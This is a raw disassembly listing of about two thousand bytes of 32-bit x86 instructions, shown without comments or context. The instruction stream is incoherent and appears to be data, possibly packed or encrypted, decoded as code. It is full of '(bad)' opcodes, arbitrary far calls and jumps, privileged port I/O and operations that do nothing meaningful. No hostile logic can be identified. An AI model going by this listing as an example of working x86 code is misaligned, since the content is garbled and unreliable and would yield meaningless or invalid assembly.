  414de7:	call   0x9a3b:0xa524be01
  414dee:	inc    eax
  414def:	enter  0x381a,0x67
  414df3:	test   BYTE PTR [edx+0x26bc70b1],0x7
  414dfa:	outs   dx,DWORD PTR ds:[esi]
  414dfb:	fmul   st(6),st
  414dfd:	xor    DWORD PTR [edi*4+0x25b42e74],esp
  414e04:	cli    
  414e05:	add    al,0x60
  414e07:	lea    ebp,[edx+0x2e1cd842]
  414e0d:	push   esp
  414e0e:	retf   
  414e0f:	sub    al,0xea
  414e11:	or     al,0x80
  414e13:	ds jb  0x414da6
  414e16:	loop   0x414e12
  414e18:	jns    0x414da9
  414e1a:	fadd   DWORD PTR [edi+0x76bf472b]
  414e20:	jp     0x414e49
  414e22:	(bad)  
  414e23:	leave  
  414e24:	in     al,dx
  414e25:	enter  0x5f66,0x8a
  414e29:	mov    dh,0x12
  414e2b:	repnz dec ecx
  414e2d:	stos   DWORD PTR es:[edi],eax
  414e2e:	call   DWORD PTR [edi-0x78]
  414e31:	mov    dh,0xbc
  414e33:	cmp    al,0x84
  414e35:	pop    esp
  414e36:	in     eax,dx
  414e37:	sbb    eax,0xe0a8570b
  414e3c:	(bad)  
  414e3d:	sbb    DWORD PTR [eax-0x2],ebp
  414e40:	cdq    
  414e41:	test   DWORD PTR [eax],edi
  414e43:	out    dx,eax
  414e44:	scas   eax,DWORD PTR es:[edi]
  414e45:	repnz inc ebx
  414e47:	mov    DWORD PTR [ecx-0x6f],esp
  414e4a:	dec    ebp
  414e4b:	test   ch,ch
  414e4d:	pop    ds
  414e4e:	stos   DWORD PTR es:[edi],eax
  414e4f:	pusha  
  414e50:	and    esp,DWORD PTR [bp+di]
  414e53:	mov    eax,ds:0x92ebcb06
  414e58:	cmp    eax,0xa6bcd21
  414e5d:	(bad)  
  414e5e:	push   ebx
  414e5f:	stos   BYTE PTR es:[edi],al
  414e60:	xor    eax,0xdf6fe4ab
  414e65:	or     dh,BYTE PTR [edx+edi*2+0x25839f55]
  414e6c:	sti    
  414e6d:	sbb    al,0xec
  414e6f:	(bad)  [eax+0x1cb41c9a]
  414e75:	dec    eax
  414e76:	addr16 push ebp
  414e78:	imul   ebx,DWORD PTR [esi+0x7c73a30b],0x1cd879c1
  414e82:	mov    al,0xc4
  414e84:	or     al,0x8c
  414e86:	repz dec ebx
  414e88:	rcr    BYTE PTR ds:0x94fa378b,1
  414e8e:	fwait
  414e8f:	sbb    eax,edi
  414e91:	cld    
  414e92:	pop    ebp
  414e93:	inc    ebx
  414e94:	mov    ds:0xf24eaaeb,eax
  414e99:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e9b:	jmp    edx
  414e9d:	xchg   esi,eax
  414e9e:	pop    es
  414e9f:	pop    edx
  414ea0:	xchg   bl,dh
  414ea2:	call   0x9218:0x6fdaabc5
  414ea9:	sub    DWORD PTR [edx+0x531dae32],edx
  414eaf:	jg     0x414eca
  414eb1:	sbb    al,0x44
  414eb3:	das    
  414eb4:	and    al,ch
  414eb6:	hlt    
  414eb7:	mov    edi,DWORD PTR [ecx]
  414eb9:	je     0x414e60
  414ebb:	push   0xbb3a0ab9
  414ec0:	mov    ebx,0xc8d50a38
  414ec5:	outs   dx,DWORD PTR ds:[esi]
  414ec6:	stos   BYTE PTR es:[edi],al
  414ec7:	cmp    al,0x2e
  414ec9:	mov    es,WORD PTR [eax]
  414ecb:	maskmovq mm6,(bad)
  414ecc:	div    DWORD PTR [edi-0x4acc9378]
  414ed2:	(bad)  
  414ed3:	aaa    
  414ed4:	inc    edi
  414ed5:	push   ebx
  414ed6:	and    DWORD PTR [ecx+eax*8+0x2a],0xdc0c8f9f
  414ede:	div    DWORD PTR [ebx]
  414ee0:	(bad)  
  414ee3:	adc    DWORD PTR [edi+eiz*2-0x532d0421],esi
  414eea:	out    dx,al
  414eeb:	iret   
  414eec:	stc    
  414eed:	xor    BYTE PTR [esi-0x71],ch
  414ef0:	retf   0x5388
  414ef3:	scas   al,BYTE PTR es:[edi]
  414ef4:	aam    0x11
  414ef6:	push   es
  414ef7:	jns    0x414f31
  414ef9:	das    
  414efa:	adc    BYTE PTR [eax+0x6f],bl
  414efd:	out    dx,al
  414efe:	rep stos BYTE PTR es:[edi],al
  414f00:	xchg   ecx,eax
  414f01:	cli    
  414f02:	sub    DWORD PTR [edi+ecx*1],eax
  414f05:	xlat   BYTE PTR ds:[ebx]
  414f06:	imul   edi,DWORD PTR [edi],0x6659d59c
  414f0c:	test   BYTE PTR [ecx+ebx*4],0x34
  414f10:	pusha  
  414f11:	sbb    esp,DWORD PTR [edi-0x75a417e5]
  414f17:	repnz ficom DWORD PTR [ebx+0x4e95ca0b]
  414f1e:	jno    0x414ef5
  414f20:	jp     0x414f08
  414f22:	add    edx,DWORD PTR [esi-0x5d]
  414f25:	mov    WORD PTR [eax+0x22],ds
  414f28:	mov    edi,0xff891c3c
  414f2d:	mov    edi,0x66572644
  414f32:	repnz cmp dl,BYTE PTR [ecx]
  414f35:	inc    esi
  414f36:	inc    esp
  414f37:	mov    cl,0xf5
  414f39:	ins    BYTE PTR es:[edi],dx
  414f3a:	ins    DWORD PTR es:[edi],dx
  414f3b:	or     esi,esi
  414f3d:	sahf   
  414f3e:	adc    ebp,0xffffffaa
  414f41:	and    eax,0x1b615119
  414f46:	sbb    eax,DWORD PTR [esi+0x75]
  414f49:	adc    eax,0xf948beba
  414f4e:	sub    bh,BYTE PTR [esi+0x49fb596a]
  414f54:	mov    WORD PTR [esi-0x4058928],ss
  414f5a:	cs pop ebx
  414f5c:	adc    ebx,edi
  414f5e:	(bad)  
  414f5f:	sbb    al,0x97
  414f61:	inc    edi
  414f62:	ret    
  414f63:	cmp    DWORD PTR [ebx-0x64],0xbcf3a4ce
  414f6a:	out    0xa0,eax
  414f6c:	in     al,dx
  414f6d:	mov    bh,0x51
  414f6f:	imul   esp,DWORD PTR [esi-0x3236b33c],0xd08cc6e4
  414f79:	ss add al,0x4b
  414f7c:	xor    cl,BYTE PTR [esi+0x47301de2]
  414f82:	xchg   esp,eax
  414f83:	test   ax,0x65ce
  414f87:	push   esi
  414f88:	cmp    esp,ebp
  414f8a:	mov    ?,edx
  414f8c:	bound  ebp,QWORD PTR [ebp-0x7110345]
  414f92:	xchg   DWORD PTR [edx+0x5be9c3f],edi
  414f98:	(bad)  
  414f99:	mov    edx,0xec6eb4e9
  414f9e:	loop   0x414fab
  414fa0:	inc    ebp
  414fa1:	xor    eax,0xeb7706cf
  414fa6:	retf   
  414fa7:	push   cs
  414fa8:	pop    ecx
  414fa9:	xchg   BYTE PTR [edi+eax*1-0x19],ah
  414fad:	mov    eax,0x85afc821
  414fb2:	xchg   ebx,eax
  414fb3:	cdq    
  414fb4:	sbb    al,0x47
  414fb6:	pusha  
  414fb7:	call   0x306fbbfa
  414fbc:	xchg   edi,eax
  414fbd:	test   DWORD PTR [edi-0x49aad5cc],0x8910c596
  414fc7:	call   DWORD PTR [ebx-0x24]
  414fca:	dec    esi
  414fcb:	aas    
  414fcc:	add    DWORD PTR [ebx+edi*2-0x5e62a54a],edi
  414fd3:	scas   eax,DWORD PTR es:[edi]
  414fd4:	mov    bh,0xcc
  414fd6:	mov    fs,esp
  414fd8:	fwait
  414fd9:	xchg   ebp,eax
  414fda:	sahf   
  414fdb:	sahf   
  414fdc:	add    edx,DWORD PTR [edi]
  414fde:	aaa    
  414fdf:	sbb    ch,BYTE PTR [eax+0x4ec50606]
  414fe5:	mov    ecx,0x500e179d
  414fea:	arpl   WORD PTR [ecx],ax
  414fec:	cmp    eax,0xbde314e3
  414ff1:	add    edx,DWORD PTR [edx]
  414ff3:	fs inc ecx
  414ff5:	jbe    0x414fc2
  414ff7:	daa    
  414ff8:	call   0xccd1da89
  414ffd:	(bad)  
  414ffe:	dec    esp
  414fff:	sar    BYTE PTR [ebx],1
  415001:	push   ss
  415002:	push   0xaec340d3
  415007:	sbb    edi,DWORD PTR [eax]
  415009:	inc    ebp
  41500a:	iret   
  41500b:	jmp    0x414fa0
  41500d:	in     al,dx
  41500e:	mov    dl,0x88
  415010:	mov    dh,0x5e
  415012:	fidivr DWORD PTR [ebx+0x5919755d]
  415018:	pop    eax
  415019:	(bad)  [edx-0x6b04131]
  41501f:	fsubp  st(6),st
  415021:	push   esi
  415022:	(bad)  
  415023:	mov    ah,0xc2
  415025:	jl     0x41504e
  415027:	add    BYTE PTR [edi],ah
  415029:	cmp    al,0x88
  41502b:	jg     0x414fdf
  41502d:	call   FWORD PTR [ecx-0x3b]
  415030:	stc    
  415031:	inc    esi
  415032:	repnz aad 0x29
  415035:	test   BYTE PTR [edx+0x357c8611],cl
  41503b:	pop    edx
  41503c:	jp     0x415098
  41503e:	in     al,0xcb
  415040:	gs je  0x41509c
  415043:	inc    ebx
  415044:	lds    bp,DWORD PTR [eax+0x38b0bd21]
  41504b:	fstp   DWORD PTR ds:0x170497e
  415051:	xchg   edi,eax
  415052:	call   0xe2acec9a
  415057:	xchg   esp,eax
  415058:	dec    eax
  415059:	test   eax,0x22556a61
  41505e:	jg     0x415054
  415060:	ret    0xe395
  415063:	int    0xcd
  415065:	dec    ecx
  415066:	push   es
  415067:	mov    ch,0xbb
  415069:	add    eax,0x89025345
  41506e:	imul   ebx,DWORD PTR [esi+0x54],0xffffffb1
  415072:	push   ebp
  415073:	mov    edx,DWORD PTR [eax-0x3c2a4adc]
  415079:	jno    0x4150de
  41507b:	dec    BYTE PTR [eax+0x21]
  41507e:	nop
  41507f:	add    esi,DWORD PTR [ebx+0x30]
  415082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415083:	sub    eax,0x96469c19
  415088:	sbb    eax,DWORD PTR [ebx+0x6cea3ef0]
  41508e:	lods   al,BYTE PTR ds:[esi]
  41508f:	add    cl,BYTE PTR [ecx]
  415091:	mov    edi,0x628425b5
  415096:	sar    DWORD PTR [ebx-0x3e506835],1
  41509c:	mov    BYTE PTR [ebp+esi*8+0x4176a624],cl
  4150a3:	pop    esp
  4150a4:	cmp    edx,eax
  4150a6:	jnp    0x41508e
  4150a8:	add    eax,0x60826bab
  4150ad:	cmp    al,0x69
  4150af:	mov    ds:0x46346238,al
  4150b4:	jae    0x41512b
  4150b6:	sbb    BYTE PTR [ecx],0x8
  4150b9:	xor    ecx,edx
  4150bb:	outs   dx,DWORD PTR ds:[esi]
  4150bc:	xchg   esi,eax
  4150bd:	cmp    bl,al
  4150bf:	nop
  4150c0:	pop    esp
  4150c1:	sahf   
  4150c2:	loop   0x4150e8
  4150c4:	cdq    
  4150c5:	je     0x415131
  4150c7:	out    dx,al
  4150c8:	dec    eax
  4150c9:	jmp    0x415134
  4150cb:	dec    edi
  4150cc:	xchg   edi,eax
  4150cd:	sbb    bh,BYTE PTR ds:0xcc757a5a
  4150d3:	clc    
  4150d4:	jmp    0x415072
  4150d6:	mov    bl,0x1b
  4150d8:	icebp  
  4150d9:	push   edx
  4150da:	in     al,dx
  4150db:	xor    eax,esp
  4150dd:	sbb    eax,0x455805e4
  4150e2:	inc    ebp
  4150e3:	add    al,0x96
  4150e5:	pop    ecx
  4150e6:	mov    al,ds:0x588060af
  4150eb:	shr    DWORD PTR ds:0xabffd090,0xdc
  4150f2:	xor    eax,ecx
  4150f4:	mov    al,ds:0x6aa753cd
  4150f9:	popa   
  4150fa:	and    al,0x41
  4150fc:	cmp    al,0x79
  4150fe:	mov    bh,0xbb
  415100:	add    al,0x97
  415102:	ret    0xb2b0
  415105:	and    al,0xa2
  415107:	adc    BYTE PTR [edi+edi*4+0x3],ah
  41510b:	xor    BYTE PTR [edi-0x75e12136],bl
  415111:	lahf   
  415112:	mov    eax,ds:0xae0583aa
  415117:	xor    eax,edi
  415119:	out    dx,al
  41511a:	inc    edi
  41511b:	js     0x415126
  41511d:	ret    
  41511e:	sub    eax,0x652e275f
  415123:	in     eax,dx
  415124:	mov    ds:0x104fcf30,eax
  415129:	push   esp
  41512a:	jno    0x41519f
  41512c:	xchg   ebp,eax
  41512d:	push   ecx
  41512e:	adc    al,0xaa
  415130:	mov    cs,WORD PTR [ebx]
  415132:	mov    edx,0x2b9103bd
  415137:	inc    edx
  415138:	adc    ecx,DWORD PTR ds:0x35dbbea
  41513e:	jl     0x415159
  415140:	jnp    0x41516f
  415142:	scas   al,BYTE PTR es:[edi]
  415143:	(bad)  
  415144:	dec    ebp
  415145:	mov    bl,0xf
  415147:	(bad)  
  415148:	cmp    dh,bh
  41514a:	adc    BYTE PTR [edx+0x76],dl
  41514d:	sub    DWORD PTR [edx+eiz*8-0x22a2aa83],esi
  415154:	pop    ds
  415155:	in     al,dx
  415156:	rcl    DWORD PTR [edx],1
  415158:	push   edi
  415159:	cmp    BYTE PTR [edx],ah
  41515b:	bound  ebx,QWORD PTR [edi-0x1e92c869]
  415161:	test   eax,0x56ca9a4b
  415166:	and    BYTE PTR [edi+ebp*2-0x78b404f4],0x3f
  41516e:	repz adc ebx,eax
  415171:	add    dh,BYTE PTR [ebp+0x66]
  415174:	movhpd QWORD PTR [edi],xmm0
  415178:	sub    esi,DWORD PTR [esi-0x4e55704f]
  41517e:	push   ecx
  41517f:	popa   
  415180:	cli    
  415181:	push   edx
  415182:	loopne 0x4151c1
  415184:	mov    bh,0x1b
  415186:	shl    DWORD PTR [ecx+0x4c],1
  415189:	and    cl,BYTE PTR [eax+0x2]
  41518c:	mov    esp,DWORD PTR [ebp-0x12]
  41518f:	mov    ch,0xfb
  415191:	ins    BYTE PTR es:[edi],dx
  415192:	jae    0x41515e
  415194:	pop    edx
  415195:	aam    0xa8
  415197:	xchg   esp,eax
  415198:	sbb    edx,DWORD PTR [eax+edi*8]
  41519b:	mov    edx,0xf77c0792
  4151a0:	jl     0x4151f9
  4151a2:	push   cs
  4151a3:	icebp  
  4151a4:	or     eax,0x19c7138e
  4151a9:	lahf   
  4151aa:	dec    edx
  4151ab:	in     eax,dx
  4151ac:	fsubr  st,st(5)
  4151ae:	fsubr  QWORD PTR [ecx+0x2f]
  4151b1:	test   ecx,eax
  4151b3:	sbb    dh,0xb0
  4151b6:	(bad)  
  4151b7:	mov    al,0xc4
  4151b9:	cmp    BYTE PTR [edx+0x5b],dh
  4151bc:	add    DWORD PTR [eax],edi
  4151be:	push   esp
  4151bf:	stos   BYTE PTR es:[edi],al
  4151c0:	jno    0x415207
  4151c2:	add    ah,BYTE PTR [ecx]
  4151c4:	mov    cl,0xfb
  4151c6:	adc    esp,DWORD PTR [ebx+0x65]
  4151c9:	xchg   edi,eax
  4151ca:	jbe    0x4151c6
  4151cc:	repz loop 0x415164
  4151cf:	stos   DWORD PTR es:[edi],eax
  4151d0:	pop    ebx
  4151d1:	mov    ch,0x62
  4151d3:	retf   
  4151d4:	xchg   DWORD PTR [ecx-0x65c72860],esp
  4151da:	fild   WORD PTR [edx-0x6c]
  4151dd:	(bad)  
  4151de:	push   ecx
  4151df:	data16 cmp bl,BYTE PTR [ecx+0x1bbe949c]
  4151e6:	aaa    
  4151e7:	push   ebx
  4151e8:	fst    DWORD PTR [eax-0x45]
  4151eb:	outs   dx,BYTE PTR ds:[esi]
  4151ec:	stos   DWORD PTR es:[edi],eax
  4151ed:	stc    
  4151ee:	jmp    0x415198
  4151f0:	retf   0xa8f6
  4151f3:	sbb    ebx,DWORD PTR [edx+eax*1-0x3f]
  4151f7:	mov    ch,0xc5
  4151f9:	imul   ebx,DWORD PTR [esi-0x6eb512ae],0xe617e1c9
  415203:	repz mov ds:0xcaf570cb,eax
  415209:	pop    edx
  41520a:	test   eax,0x43fa8564
  41520f:	xor    ch,bl
  415211:	gs out 0x4b,al
  415214:	push   esp
  415215:	adc    al,0x56
  415217:	cmp    eax,0xfcfe872e
  41521c:	jne    0x4151fb
  41521e:	cmp    WORD PTR [esi+ecx*8],0x43
  415223:	les    esp,FWORD PTR [edi+0x3cbf30dc]
  415229:	clc    
  41522a:	dec    edx
  41522b:	shr    DWORD PTR [edi],0xd
  41522e:	aad    0xc5
  415230:	loope  0x4151c9
  415232:	push   esp
  415233:	in     eax,0xf7
  415235:	test   eax,0xdb0f9502
  41523a:	or     al,0xd3
  41523c:	rcr    BYTE PTR [esi+0x16],0xf4
  415240:	loop   0x415217
  415242:	sub    esp,DWORD PTR [ebx]
  415244:	xchg   ecx,eax
  415245:	in     al,0xd4
  415247:	pop    es
  415248:	mov    dl,0x8e
  41524a:	mov    edx,esp
  41524c:	push   esp
  41524d:	mov    ah,0x43
  41524f:	sub    eax,0x9b8e5471
  415254:	xor    ecx,DWORD PTR [ecx+0x65c45729]
  41525a:	ins    BYTE PTR es:[edi],dx
  41525b:	cmp    ch,bh
  41525d:	add    eax,DWORD PTR [esi-0x2e]
  415260:	sub    DWORD PTR [edi],0x206bb8e1
  415266:	pushf  
  415267:	lock sbb ch,bh
  41526a:	dec    esi
  41526b:	scas   al,BYTE PTR es:[edi]
  41526c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41526d:	sahf   
  41526e:	inc    edx
  41526f:	pushf  
  415270:	xlat   BYTE PTR ds:[ebx]
  415271:	jecxz  0x415293
  415273:	xchg   esi,eax
  415274:	mov    edi,0x38b205b4
  415279:	adc    esp,eax
  41527b:	sub    dl,BYTE PTR [esi+0x15a7b1f2]
  415281:	sub    BYTE PTR [esi+edi*2-0x75],bl
  415285:	jle    0x4152b3
  415287:	adc    eax,0x49b1e020
  41528c:	mov    eax,ds:0x566ebf36
  415291:	dec    eax
  415292:	(bad)  
  415294:	(bad)  [edx+0x541bca4f]
  41529a:	cs xchg ecx,eax
  41529c:	sub    bh,BYTE PTR [ebx+0x11]
  41529f:	xchg   esp,eax
  4152a0:	and    al,BYTE PTR ds:0x72050b80
  4152a6:	pop    eax
  4152a7:	cmp    al,0xed
  4152a9:	jmp    0x73d1:0xcb724b3a
  4152b0:	cwde   
  4152b1:	iret   
  4152b2:	aaa    
  4152b3:	rcr    DWORD PTR [ebp+ebx*2+0x29e83ef9],0x6d
  4152bb:	jns    0x415264
  4152bd:	call   0x40b7:0xc9acc2ba
  4152c4:	push   esi
  4152c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152c6:	imul   BYTE PTR [ebp+0x54]
  4152c9:	jne    0x4152e3
  4152cb:	js     0x415275
  4152cd:	xchg   DWORD PTR [edi+0x52efd00a],ebx
  4152d3:	jne    0x415279
  4152d5:	sub    esp,DWORD PTR [edi+0x19]
  4152d8:	inc    ebp
  4152d9:	add    bl,0x98
  4152dc:	mov    DWORD PTR [esp+esi*4],edi
  4152df:	pusha  
  4152e0:	add    al,cl
  4152e2:	cmp    dl,dh
  4152e4:	fild   DWORD PTR [edx-0x56]
  4152e7:	imul   edx,DWORD PTR [ebx],0xf7513f44
  4152ed:	retf   
  4152ee:	sahf   
  4152ef:	int3   
  4152f0:	in     eax,0x65
  4152f2:	inc    ecx
  4152f3:	push   ecx
  4152f4:	lea    ebp,[eax-0x3b0cb71d]
  4152fa:	retf   
  4152fb:	gs cs sti 
  4152fe:	mov    ds:0x58667125,eax
  415303:	shr    eax,1
  415305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415306:	mov    ebx,0x5ebb99bb
  41530b:	sbb    al,0x85
  41530e:	sar    BYTE PTR [eax+0x20],1
  415311:	aaa    
  415312:	inc    ebp
  415313:	push   es
  415314:	sbb    bl,BYTE PTR [edx-0x142bb61e]
  41531a:	or     BYTE PTR [ebp+0x3292fb53],dl
  415320:	fisub  WORD PTR [edx+0x7cf97374]
  415326:	enter  0xa00f,0xe6
  41532a:	or     DWORD PTR [edx+0x44],esi
  41532d:	sub    BYTE PTR [ecx+edx*1-0x37189422],bl
  415334:	fsub   QWORD PTR [ebp-0x4f746b6e]
  41533a:	mov    ecx,0x2c06efb3
  41533f:	enter  0xaa19,0x9d
  415343:	xchg   edi,eax
  415344:	or     al,0x84
  415346:	fnstenv [ecx]
  415348:	inc    esp
  415349:	mov    ds:0xb1198731,eax
  41534e:	popa   
  41534f:	cwde   
  415350:	xor    DWORD PTR [ecx],ecx
  415352:	ds inc esi
  415354:	loop   0x415392
  415356:	add    ecx,DWORD PTR [eax+0x45]
  415359:	cmp    eax,DWORD PTR [eax-0x1a]
  41535c:	(bad)  [esi-0xa6ccfe6]
  415362:	add    dl,cl
  415364:	das    
  415365:	shl    DWORD PTR ss:[esp+eax*1+0x60],1
  41536a:	fwait
  41536b:	test   esp,esp
  41536d:	inc    DWORD PTR [esi]
  41536f:	add    eax,0x13f0fb01
  415374:	call   0xb9d4:0x18d9958e
  41537b:	sbb    DWORD PTR [ebx+0x2f],ebx
  41537e:	fist   DWORD PTR [eax]
  415380:	lahf   
  415381:	ror    DWORD PTR [esi+0x4f],1
  415384:	dec    esp
  415385:	enter  0x160,0x51
  415389:	adc    ch,BYTE PTR [ebp+ecx*8+0x34]
  41538d:	fnstenv [ebx-0x6f]
  415390:	push   edi
  415391:	or     ecx,DWORD PTR [ebp-0x3ccf5f2a]
  415397:	sub    cl,BYTE PTR [edi]
  415399:	enter  0x50a8,0x47
  41539d:	push   0x20
  41539f:	inc    eax
  4153a0:	cld    
  4153a1:	inc    ebx
  4153a2:	pop    ds
  4153a3:	push   ebp
  4153a4:	or     al,BYTE PTR [edx]
  4153a6:	mov    edx,0x1aa9af2d
  4153ab:	(bad)  
  4153ac:	repnz inc eax
  4153ae:	into   
  4153af:	std    
  4153b0:	adc    dl,0x8e
  4153b3:	test   al,0x3e
  4153b5:	retf   0x3b5a
  4153b8:	das    
  4153b9:	xchg   ebx,eax
  4153ba:	icebp  
  4153bb:	lds    edx,FWORD PTR [ebx]
  4153bd:	loopne 0x4153c1
  4153bf:	mov    WORD PTR [ebx-0x65ec5424],cs
  4153c5:	js     0x4153cc
  4153c7:	ret    0xb27d
  4153ca:	js     0x4153f2
  4153cc:	repnz or al,0xa0
  4153cf:	out    0x7b,eax
  4153d1:	adc    esi,DWORD PTR [edx+0x572a7e62]
  4153d7:	ins    BYTE PTR es:[edi],dx
  4153d8:	loop   0x415451
  4153da:	js     0x415424
  4153dc:	adc    al,0x24
  4153de:	lds    esi,FWORD PTR [ebp+0x6f]
  4153e1:	sar    BYTE PTR [ebx+0x78],0x9a
  4153e5:	add    ebp,DWORD PTR [edx-0x18]
  4153e8:	xor    al,0xcf
  4153ea:	jns    0x4153af
  4153ec:	shl    DWORD PTR ds:0x5bc917d5,0x45
  4153f3:	mov    edx,0xc4b907ad
  4153f8:	aam    0x33
  4153fa:	xor    DWORD PTR [ebp+0x6],edi
  4153fd:	leave  
  4153fe:	shr    ch,cl
  415400:	push   esi
  415401:	idiv   DWORD PTR [edx]
  415403:	imul   DWORD PTR [ebx]
  415405:	sub    eax,esp
  415407:	fbstp  TBYTE PTR [ebx+0x28f93baa]
  41540d:	jae    0x4153ac
  41540f:	sbb    al,0x1f
  415411:	mov    bl,0x29
  415413:	sbb    esp,ecx
  415415:	push   eax
  415416:	sbb    ebp,ebx
  415418:	xor    BYTE PTR es:[edi+0x3],bh
  41541c:	push   eax
  41541d:	push   edi
  41541e:	sub    al,0xd4
  415420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415421:	and    eax,0xe4df8632
  415426:	pop    edi
  415427:	stc    
  415428:	adc    DWORD PTR [esi-0xf],0x7f
  41542c:	jnp    0x4153f3
  41542e:	mov    cl,0xaf
  415430:	sub    al,0xaf
  415432:	imul   ecx,ebx,0xffffffee
  415435:	popa   
  415436:	ds xchg esp,eax
  415438:	xor    al,0x98
  41543a:	sub    edx,ebp
  41543c:	dec    ebp
  41543d:	mov    DWORD PTR ds:0xb9047fd7,edi
  415443:	mov    edi,0xbc15b8c6
  415448:	test   BYTE PTR [eax+0x82356ce],ch
  41544e:	gs scas eax,DWORD PTR es:[edi]
  415450:	leave  
  415451:	fisttp DWORD PTR [esi+ebx*1+0x591d02f9]
  415458:	in     eax,0xc9
  41545a:	dec    ebx
  41545b:	sbb    bh,ah
  41545d:	imul   ecx,DWORD PTR [edx+0xbe8233a],0x5528a8e6
  415467:	and    al,BYTE PTR [eax-0x67]
  41546a:	dec    eax
  41546b:	shr    eax,1
  41546d:	adc    al,0x31
  41546f:	or     al,BYTE PTR [ebx+0x65]
  415472:	out    0xaf,eax
  415474:	popa   
  415475:	cmp    ch,BYTE PTR [esi-0x4f]
  415478:	ins    DWORD PTR es:[edi],dx
  415479:	ins    DWORD PTR es:[edi],dx
  41547a:	jp     0x41549b
  41547c:	inc    ebp
  41547d:	(bad)  
  41547e:	adc    BYTE PTR [esi],cl
  415480:	mov    ebp,0x534f14b3
  415485:	jle    0x415476
  415487:	inc    ebp
  415488:	dec    edi
  415489:	or     esp,ecx
  41548b:	xor    ah,BYTE PTR [ebp+0x1d18a4b7]
  415491:	or     al,0xe4
  415493:	pop    ss
  415494:	cld    
  415495:	stos   BYTE PTR es:[edi],al
  415496:	call   0xee9b:0x1cb1ee2f
  41549d:	xor    esp,DWORD PTR [edx]
  41549f:	fiadd  DWORD PTR [esi+0x7a5822a5]
  4154a5:	jae    0x415460
  4154a7:	add    BYTE PTR [ebx],al
  4154a9:	xlat   BYTE PTR ds:[ebx]
  4154aa:	mov    ds:0x2a6d0671,eax
  4154af:	pop    eax
  4154b0:	(bad)  
  4154b1:	fbstp  TBYTE PTR [ebx]
  4154b3:	mov    bl,0xa8
  4154b5:	js     0x4154b4
  4154b7:	xchg   edx,eax
  4154b9:	out    dx,eax
  4154ba:	dec    ebx
  4154bb:	push   ecx
  4154bc:	in     eax,0x5a
  4154be:	ret    0x1dbf
  4154c1:	jmp    FWORD PTR [ebx-0xfbeea16]
  4154c7:	xor    eax,0xb7667f34
  4154cc:	outs   dx,DWORD PTR ds:[esi]
  4154cd:	stos   BYTE PTR es:[edi],al
  4154ce:	adc    eax,0x51d00f33
  4154d3:	loop   0x415485
  4154d5:	mov    bh,0x35
  4154d7:	or     eax,0x9368ee1c
  4154dc:	icebp  
  4154dd:	lahf   
  4154de:	xchg   edx,eax
  4154df:	jmp    0xdb9ac2f3
  4154e4:	xor    BYTE PTR [edx],dl
  4154e6:	not    DWORD PTR [ebx-0x154b5781]
  4154ec:	jno    0x4154c9
  4154ee:	mov    edx,0xc9daca5e
  4154f3:	pop    edx
  4154f4:	icebp  
  4154f5:	loop   0x415497
  4154f7:	lods   al,BYTE PTR ds:[esi]
  4154f8:	xor    esi,DWORD PTR [esi+0x19068c8f]
  4154fe:	sbb    edx,eax
  415500:	fdivr  QWORD PTR [esi]
  415502:	push   eax
  415503:	jmp    0x4154ae
  415505:	in     al,dx
  415506:	and    cl,BYTE PTR [ebp-0x75]
  415509:	ret    
  41550a:	push   ecx
  41550b:	stc    
  41550c:	out    dx,eax
  41550d:	pop    es
  41550e:	(bad)  [esi]
  415510:	das    
  415511:	jo     0x41552f
  415513:	not    DWORD PTR [ebx]
  415515:	rcr    DWORD PTR [eax+ebx*1],1
  415518:	mov    eax,0xb0e16027
  41551d:	push   ecx
  41551e:	repnz mov bl,0x8c
  415521:	or     al,0xfa
  415523:	ror    esp,1
  415525:	ins    BYTE PTR es:[edi],dx
  415526:	xor    ecx,DWORD PTR [eax+edx*8]
  415529:	ficomp WORD PTR [edi+0x4c66445a]
  41552f:	ins    BYTE PTR es:[edi],dx
  415530:	aas    
  415531:	sbb    al,0x5b
  415533:	pop    edx
  415534:	lods   eax,DWORD PTR ds:[esi]
  415535:	mov    edi,0x6460ef72
  41553a:	call   0xbd18:0x80e38f33
  415541:	ret    
  415542:	mov    ecx,DWORD PTR [ebp+0x6c]
  415545:	inc    eax
  415546:	xor    esi,ecx
  415548:	cli    
  415549:	pop    DWORD PTR ds:0xc9edceef
  41554f:	push   esi
  415550:	(bad)  
  415551:	mov    dl,0x11
  415553:	stos   DWORD PTR es:[edi],eax
  415554:	pushf  
  415555:	mov    ah,dh
  415557:	xor    al,0xee
  415559:	xor    eax,0xf348043e
  41555e:	cwde   
  41555f:	in     eax,0x1
  415561:	fistp  QWORD PTR [ebx+0x779fa953]
  415567:	jnp    0x415556
  415569:	mov    bh,0xde
  41556b:	lock add eax,0x7ca2c9b3
  415571:	push   edi
  415572:	int    0xd8
  415574:	out    dx,al
  415575:	xchg   esp,eax
  415576:	push   ds
  415577:	in     ax,0xe8
  41557a:	push   ss
  41557b:	lods   al,BYTE PTR ds:[esi]
  41557c:	shl    ebx,cl
  41557e:	call   0x4d6408f7
  415583:	bound  ebx,QWORD PTR [edi+0x7e9b860d]
  415589:	mov    esp,0x3dbb0b90
  41558e:	les    eax,FWORD PTR [ecx+eax*1+0x65]
  415592:	mov    ebp,0x89d0ab38
  415597:	sub    BYTE PTR [ebp-0x538d7b42],ah
  41559d:	cwde   
  41559e:	das    
  41559f:	lds    eax,FWORD PTR [ebp+0xd]
  4155a2:	mov    BYTE PTR [ecx-0x23cc2ea6],dh
  4155a8:	int3   
  4155a9:	sbb    ecx,DWORD PTR cs:[edx+0x2e3cc755]
  4155b0:	cs mov ebx,0xfa7c0961
  4155b6:	test   DWORD PTR [edi+0x7331379c],0x7848e237
  4155c0:	sbb    al,BYTE PTR [ebx+0x384c86ac]
  4155c6:	dec    ebx
  4155c7:	inc    esi
  4155c8:	dec    ecx
  4155c9:	dec    esp
  4155ca:	inc    ebp
  4155cb:	xchg   edx,eax
  4155cc:	out    0xd2,al
  4155ce:	dec    edi
  4155cf:	mov    eax,ds:0x4030ab20
  4155d4:	add    esp,0x72
  4155d7:	pop    esi
  4155d8:	js     0x415576
  4155da:	xchg   edi,eax
  4155db:	lea    edx,[esp+edi*8+0x32]
  4155df:	dec    ecx
  4155e0:	mov    ch,0x0
  4155e2:	inc    ecx
  4155e3:	add    DWORD PTR [edx],ebp
  4155e5:	jp     0x4155cc
